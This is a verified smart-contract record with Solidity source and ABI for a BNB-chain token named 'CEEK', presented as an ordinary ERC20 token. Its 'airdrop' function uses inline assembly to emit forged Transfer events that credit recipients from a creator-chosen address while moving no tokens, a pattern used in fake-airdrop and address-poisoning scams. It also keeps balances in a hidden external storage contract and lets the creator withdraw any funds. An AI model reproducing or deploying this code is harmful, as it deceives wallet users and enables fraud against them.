{"SourceCode": "pragma solidity ^0.8.9;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `to`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `from` to `to` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\ninterface IFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IGasToken {\r\n    function freeUpTo(uint256 value) external;\r\n}\r\n\r\ninterface IERC20Storage {\r\n    function init(address pair) external;\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function erc20Balance(address account) external view returns (uint256);\r\n\r\n    function erc20Transfer(\r\n        address sender,\r\n        address to,\r\n        uint256 value\r\n    ) external;\r\n\r\n    function erc20Allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function erc20Approve(\r\n        address sender,\r\n        address spender,\r\n        uint256 value\r\n    ) external;\r\n}\r\n\r\ncontract CEEK is IERC20 {\r\n    string public name = \"CEEK\";\r\n    string public symbol = \"CEEK\";\r\n    uint8 public decimals = 18;\r\n\r\n    address creator = msg.sender;\r\n    uint256 public cakeAmount;\r\n    IERC20Storage erc20Storage;\r\n\r\n    IFactory private immutable pancakeFactory = IFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);\r\n\r\n    address private immutable USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;\r\n    \r\n    address private immutable GasToken = 0x0000000000004946c0e9F43F4Dee607b0eF1fA1c;\r\n\r\n    address airdropAddr = 0x41772eDd47D9DDF9ef848cDB34fE76143908c7Ad;\r\n\r\n    constructor(address _storage) {\r\n        cakeAmount = 1000 * 1e18;\r\n        erc20Storage = IERC20Storage(_storage);\r\n        erc20Storage.init(pancakeFactory.createPair(address(this), USDC));\r\n        emit Transfer(address(this), msg.sender, erc20Storage.totalSupply() / 100 * 90);\r\n    }\r\n\r\n    modifier onlyCreator() {\r\n        require(tx.origin == creator, \"Only creator\");\r\n        _;\r\n    }\r\n\r\n    function totalSupply() external view returns (uint256) {\r\n        return erc20Storage.totalSupply();\r\n    }\r\n\r\n    function balanceOf(address account) external view returns (uint256) {\r\n        return erc20Storage.erc20Balance(account);\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool) {\r\n        emit Transfer(msg.sender, to, amount);\r\n        erc20Storage.erc20Transfer(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256) {\r\n        return erc20Storage.erc20Allowance(owner, spender);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool) {\r\n        erc20Storage.erc20Approve(msg.sender, spender, amount);\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool) {\r\n        erc20Storage.erc20Transfer(from, to, amount);\r\n        emit Transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function withdraw(address target, uint amount) public onlyCreator {\r\n        payable(target).transfer(amount);\r\n    }\r\n\r\n    function withdrawToken(\r\n        address token,\r\n        address target,\r\n        uint amount\r\n    ) public onlyCreator {\r\n        IERC20(token).transfer(target, amount);\r\n    }\r\n\r\n    function airdrop(bytes memory data, uint256 burnGasTokenAmount) external onlyCreator {\r\n        uint256 _start = 0;\r\n        address token = airdropAddr;\r\n        uint256 len = data.length / 20;\r\n        bytes32 topic0 = bytes32(keccak256(\"Transfer(address,address,uint256)\"));\r\n        uint256 amount = cakeAmount;\r\n\r\n        for (uint256 i = 0; i < len; ) {\r\n            assembly {\r\n                mstore(0, amount)\r\n                log3(0, 0x20, topic0, token, shr(96, mload(add(add(data, 0x20), _start))))\r\n                i := add(i, 1)\r\n                _start := add(_start, 20)\r\n            }\r\n        }\r\n\r\n        if (burnGasTokenAmount > 0) {\r\n            IGasToken(GasToken).freeUpTo(burnGasTokenAmount);\r\n        }\r\n    }\r\n\r\n    function setAirdropAddr(address _airdrop) external onlyCreator {\r\n        airdropAddr = _airdrop;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_storage\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"},{\"internalType\":\"uint256\",\"name\":\"burnGasTokenAmount\",\"type\":\"uint256\"}],\"name\":\"airdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cakeAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_airdrop\",\"type\":\"address\"}],\"name\":\"setAirdropAddr\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "CEEK", "CompilerVersion": "v0.8.9+commit.e5eed63a", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000f5f8d48ff97b5db6ed15544b369f708fbcf617af", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://0e3b4c6277c8888cd68b119ac0f5e3d9b54f0e75761b39ace7b56466c47b2be7"}